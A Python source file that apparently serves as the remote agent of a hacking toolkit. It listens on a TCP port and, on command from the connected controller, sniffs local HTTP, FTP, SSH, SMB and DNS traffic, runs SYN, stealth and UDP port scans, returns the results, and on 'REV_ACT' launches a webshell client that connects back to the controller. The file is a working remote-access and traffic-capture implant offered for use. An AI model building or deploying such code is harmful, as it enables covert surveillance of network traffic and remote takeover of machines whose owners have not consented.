import socket
from threading import Thread

import bin.PACKET_SNIFFER as snf
from PortScanner import PortScanner
from bin.Webshell_Client import Client


def get_ip_address():
    print("here")
    s = socket.socket()
    s.connect(("1.1.1.1", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


class Server(Thread):
    def __init__(self):
        self.conn = socket.socket()
        self.conn.bind((get_ip_address(), 16549))
        self.conn.listen(1)
        print('[+] Listening for income TCP connection on port 8080')
        self.conn, self.addr = self.conn.accept()
        print('[+]We got a connection from', self.addr)
        self.run()

    def run(self) -> None:
        while True:
            length = self.conn.recv(1024).decode()
            while not length:
                length = self.conn.recv(1024).decode()
            msg = self.conn.recv(int(length)).decode()
            print(msg)
            if msg == 'SNF_SRT':
                st = ''
                print('Sniffing Started')
                sorted_packets = snf.gen_sniff()
                st += snf.filter_HTTP(sorted_packets[0]) + snf.filter_ICMP(sorted_packets[1]) + snf.filter_SMB(
                    sorted_packets[2])
                st += snf.filter_FTP(sorted_packets[3]) + snf.filter_SSH(sorted_packets[4]) + snf.filterstringDNS(
                    sorted_packets[5]) + snf.filter_DHCP(sorted_packets[6])
                self.conn.send(str(len(st)).encode())
                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
                continue
            elif msg == 'SYN_SRT':
                open_ports = PortScanner(get_ip_address()).SYN_Scan_Wrap()
                st = ''
                for open_port in open_ports:
                    st += f"Port {open_port} is open!" + '\n'
                self.conn.send(str(len(st)).encode('ISO-8859-1', errors='ignore'))
                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
                continue
            elif msg == 'STEALTH_SRT':
                open_ports = PortScanner(get_ip_address()).Stealth_Scan_Wrap()
                st = ''
                for open_port in open_ports:
                    st += f"Port {open_port} is open!" + '\n'
                self.conn.send(str(len(st)).encode('ISO-8859-1', errors='ignore'))
                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
                continue
            elif msg == 'UDP_SRT':
                open_ports = PortScanner(get_ip_address()).UDP_Scan_Wrap()
                st = ''
                for open_port in open_ports:
                    st += f"Port {open_port} is open!" + '\n'
                self.conn.send(str(len(st)).encode('ISO-8859-1', errors='ignore'))
                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
                continue
            elif msg == 'REV_ACT':
                Client(self.addr[0], 9999).run()
            elif msg == 'EXIT':
                self.__init__()


def main():
    server = Server()


if __name__ == '__main__':
    main()
